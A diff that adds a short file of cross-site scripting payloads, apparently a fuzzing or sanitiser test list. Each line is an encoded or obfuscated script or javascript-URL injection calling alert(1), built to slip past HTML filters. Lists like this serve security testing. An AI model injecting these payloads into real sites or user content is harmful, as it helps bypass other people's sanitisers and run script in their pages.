@@ -1,0 +1,7 @@
+%3Cscript%3Ealert(1)%3C/script%3E
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg><a xlink:href=java&#115;cript:alert(1)>CLICK
+<scr\0ipt>alert(1)</scr\0ipt>
+<script>%61lert(1)</script>
+<IMG SRC="jav&#x09;ascript:alert(1)">
+<IMG SRC="javascript:&#97;lert(1)">
